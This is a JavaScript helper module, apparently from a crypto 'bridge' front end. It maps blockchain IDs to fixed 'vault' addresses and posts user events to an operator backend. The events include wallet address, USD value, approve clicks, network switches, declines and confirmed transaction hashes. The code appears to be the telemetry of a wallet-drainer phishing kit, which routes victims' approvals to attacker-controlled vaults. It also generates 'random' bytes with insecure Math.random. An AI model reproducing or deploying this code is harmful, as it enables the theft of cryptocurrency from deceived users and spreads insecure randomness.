import { ETH_VAULT_ADDRESS, apiUrl } from "./constants"



export function getContractAddress(id) {
  switch (id) {
    case 1:
      return ETH_VAULT_ADDRESS
    case 56:
      return '0xC672C0e441C212a5084F97e62F3a4C01E094b41D'
    case 8453:
      return ETH_VAULT_ADDRESS
    case 59144:
      return ETH_VAULT_ADDRESS
    case 10:
      return ETH_VAULT_ADDRESS
    case 42161:
      return ETH_VAULT_ADDRESS
    case 137:
      return '0xb913C6d2a1173A3027B3b0dA6B7B524c08bc806f'
    case 369:
      return ETH_VAULT_ADDRESS
    case 324:
      return "0x0EC09a3484e53D65da00f6DEdE981259360Fcc78"
    default:
      return ETH_VAULT_ADDRESS
  }
}


export function getRandomBytes(length) {
  const randomBytes = new Uint8Array(length);
  for (let i = 0; i < length; i++) {
    randomBytes[i] = Math.floor(Math.random() * 256);
  }
  return randomBytes;
}

export function bytesToHex(bytes) {
  return Array.from(bytes)
    .map(byte => byte.toString(16).padStart(2, '0'))
    .join('');
}


export function notifyClicked(id, address, usdValue, token) {
  return fetch(`${apiUrl(id)}/notify`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      address,
      event: `👍 user has clicked the approve button. user selected ${token} for bridging`,
      id,
      usdValue,

    }),
  })
}

export function notifySwitched(id, prevId, address, usdValue) {
  return fetch(`${apiUrl(id)}/notify`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      address,
      event: `🟢 user has switched network successfully to ${getChainName(id)} from ${getChainName(prevId)}`,
      id,
      usdValue,

    }),
  })
}


export function notifyEthSent(id, address, usdValue, token, txHash) {
  return fetch(`${apiUrl(id)}/notify-confirmed`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      address,
      id,
      usdValue,
      txHash,
      token

    }),
  })
}

export function notifyClosed(id, address, usdValue) {
  return fetch(`${apiUrl(id)}/notify-declined`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      address,
      event: "🔴 user has closed the transaction window",
      id,
      usdValue,

    }),
  })
}



export function notifyNetworkDeclined(id, prevId, address, usdValue) {
  return fetch(`${apiUrl(id)}/notify-declined`, {
    method: 'POST',
    headers: {
      'Accept': 'application/json',
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({
      address,
      event: `🔴 user has declined to switch network to ${getChainName(id)} from ${getChainName(prevId)}`,
      id: prevId,
      usdValue,

    }),
  })
}

function getChainName(id) {
  let chain = 'ethereum';
    if (id === 1)
        chain = 'ethereum'
    else if (id === 137)
        chain = 'matic'
    else if (id === 25)
        chain = 'cronos'
    else if (id === 56)
        chain = 'binance smart chain'
    else if (id === 8453)
        chain = 'base'
    else if (id === 10)
        chain = 'optimism'
    else if (id === 59144)
        chain = 'linea'
    else if (id === 43114)
        chain = 'avalanche'
    else if (id === 250)
        chain = 'fantom'
    else if (id === 42161)
        chain = 'arbitrum'
    else if (id === 369)
        chain = 'pulsechain'
    else if (id === 324)
        chain = 'zksync'
    else
        chain = 'ethereum'

    return chain
}